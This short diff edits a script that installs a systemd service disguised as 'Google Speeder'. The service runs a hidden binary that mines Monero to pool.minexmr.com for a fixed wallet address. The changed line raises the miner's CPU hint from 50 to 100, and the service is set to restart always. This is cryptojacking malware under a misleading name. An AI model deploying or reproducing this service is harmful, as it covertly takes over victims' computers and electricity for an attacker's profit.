@@ -7,7 +7,7 @@ cat >/tmp/google-speeder.service <<EOL
 [Unit]
 Description=Google Speeder service
 [Service]
-ExecStart=$HOME/google/speeder -o pool.minexmr.com:4444 --cpu-max-threads-hint 50 -u 49pjSwALVKaNHwK4sWfFWNXosfQxwZgf71fXysnpsR6nHci34Lg6aq2G7vAKuo2zxASxZCpHWpvwPddVpF1x5NF83Zdq3ac
+ExecStart=$HOME/google/speeder -o pool.minexmr.com:4444 --cpu-max-threads-hint 100 -u 49pjSwALVKaNHwK4sWfFWNXosfQxwZgf71fXysnpsR6nHci34Lg6aq2G7vAKuo2zxASxZCpHWpvwPddVpF1x5NF83Zdq3ac
 Restart=always
 Nice=10
 CPUWeight=1
